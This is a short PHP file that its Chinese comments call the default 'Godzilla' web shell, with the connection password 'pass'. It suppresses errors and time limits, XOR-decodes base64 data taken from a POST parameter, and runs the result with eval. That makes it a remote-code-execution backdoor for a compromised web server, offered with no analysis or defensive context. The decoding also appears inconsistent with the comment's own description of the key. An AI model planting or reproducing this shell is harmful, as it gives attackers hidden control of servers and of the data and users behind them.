<?php
@session_start();
@set_time_limit(0);
@error_reporting(0);
// 哥斯拉 (Godzilla) PHP 默认马
// 连接密码: pass
// 密钥: key (连接时自动生成)
function encode($D,$K){
    for($i=0;$i<strlen($D);$i++){
        $c=$K[$i+1&15];
        $D[$i]=$D[$i]^$c;
    }
    return $D;
}
$pass='pass';
if(isset($_POST[$pass])){
    $data=encode(base64_decode($_POST[$pass]),$pass);
    @eval($data);
}
